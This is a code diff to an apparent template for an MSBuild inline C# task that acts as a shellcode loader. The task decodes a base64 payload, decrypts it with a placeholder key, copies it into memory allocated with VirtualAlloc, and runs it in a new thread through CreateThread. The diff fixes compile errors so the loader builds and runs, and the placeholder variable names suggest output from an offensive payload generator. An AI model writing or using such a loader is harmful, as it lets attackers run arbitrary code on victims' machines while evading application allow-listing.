@@ -35,6 +35,7 @@
 		using Microsoft.Build.Utilities;
 		using Microsoft.Build.Framework;
 		using System.Management.Automation.Runspaces;
+		using System.Runtime.InteropServices;
 		
 		public class VAR2 :  Task, ITask {	
 			private static UInt32 VAR40 = 0x1000;
@@ -56,14 +57,14 @@
 						if(String.Equals(VAR8, "-->")) {
 							byte[] VAR9 = {[KEY]};
 							byte[] VAR10 = Convert.FromBase64String(VAR7.ToString());
-							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10));
+							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
 						
 							UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
 							Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
 							IntPtr VAR43 = IntPtr.Zero;
 							IntPtr VAR44 = IntPtr.Zero;
 							UInt32 VAR45 = 0;
-							VAR43 = CreateThread(0, 0, VAR42, VAR44, ref VAR45);
+							VAR43 = CreateThread(0, 0, VAR42, VAR44, 0, ref VAR45);
 							WaitForSingleObject(VAR43, 0xFFFFFFFF);
 							return true;
 						}
